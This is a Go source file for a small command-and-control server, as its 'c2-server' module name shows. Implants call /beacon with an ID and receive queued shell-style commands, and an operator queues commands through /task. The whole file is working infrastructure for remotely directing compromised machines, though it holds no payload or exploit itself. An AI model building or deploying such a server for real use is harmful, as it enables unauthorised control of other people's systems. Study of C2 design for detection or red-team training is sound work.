package main

import (
	"c2-server/models"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
)

var (
	tasks = make(map[string][]string)
	mu    sync.Mutex
)

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	req, err := decodeBeacon(r)
	if err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	fmt.Println("[client] ---> ID => " + req.ID)

	mu.Lock()
	defer mu.Unlock()
	sendTask(w, req)

}

func decodeBeacon(r *http.Request) (models.NewBeacon, error) {
	var req models.NewBeacon
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		return models.NewBeacon{}, err
	}
	return req, nil
}

func sendTask(w http.ResponseWriter, b models.NewBeacon) {
	var newTask models.NewTask

	if len(tasks[b.ID]) > 0 {
		task := tasks[b.ID][0]
		tasks[b.ID] = tasks[b.ID][1:]
		newTask.ID = b.ID
		newTask.Command = task
	} else {
		newTask.ID = b.ID
		newTask.Command = ""
	}
	json.NewEncoder(w).Encode(newTask)
}

func taskHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	var req models.NewTask
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	mu.Lock()
	defer mu.Unlock()

	tasks[req.ID] = append(tasks[req.ID], req.Command)
	json.NewEncoder(w).Encode(map[string]string{"status": "task queued"})
	fmt.Println(tasks)
}

func runServer() {
	http.HandleFunc("/beacon", beaconHandler)
	http.HandleFunc("/task", taskHandler)
	fmt.Println("Server started on port 5000")
	log.Fatal(http.ListenAndServe(":5000", nil))
}

func main() {
	runServer()
}
